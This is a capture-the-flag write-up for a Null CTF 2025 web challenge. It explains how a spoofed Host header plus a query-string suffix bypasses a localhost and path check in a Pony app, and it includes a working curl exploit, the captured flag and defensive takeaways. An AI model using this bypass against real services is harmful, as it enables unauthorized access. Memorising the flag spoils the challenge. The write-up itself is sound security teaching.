# 🐴 Codename Neigh

> **CTF:** Null CTF 2025 | **Category:** Web | **Flag:** `nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}`

---

## TL;DR

Bypass the `/flag` endpoint's security checks using **Host header spoofing** + **query string path bypass**.

```bash
curl -H "Host: 127.0.0.1" "http://target:3002/flag?x"
```

---

## Analysis

The app is written in **Pony** (hence "Neigh" 🐴). The flag handler has this check:

```pony
let path: String = ctx.request.uri().string()

if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
    // return flag
end
```

### The Vulnerability

Two flaws:
1. **Host header is user-controlled** - We can set `Host: 127.0.0.1`
2. **`uri().string()` returns full URI including query string** - `/flag?x` ≠ `/flag`

The route `/flag` still matches, but the path check is bypassed!

---

## Exploit

```bash
curl -H "Host: 127.0.0.1" "http://public.ctf.r0devnull.team:3002/flag?x"
```

```html
<b>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}</b>
```

---

## Key Takeaways

- **URI ≠ Path** - `uri().string()` includes query params, leading to bypass
- **Never trust Host header** for access control
- Obscure languages don't mean secure code
